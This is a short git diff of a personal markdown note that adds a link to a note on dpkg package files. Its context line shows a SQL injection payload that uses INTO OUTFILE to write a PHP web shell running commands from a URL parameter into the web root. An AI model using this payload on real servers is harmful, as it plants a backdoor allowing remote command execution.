@@ -8,6 +8,7 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221003150199](/zet/20221003150199/README.md) dpkg list files installed with package ##apt
 - [20221012070318](/zet/20221012070318/README.md) linux terminal
 - [20221010153630](/zet/20221010153630/README.md) make symlinks for markdown titles for search optimization
 - [20221009015558](/zet/20221009015558/README.md) docker
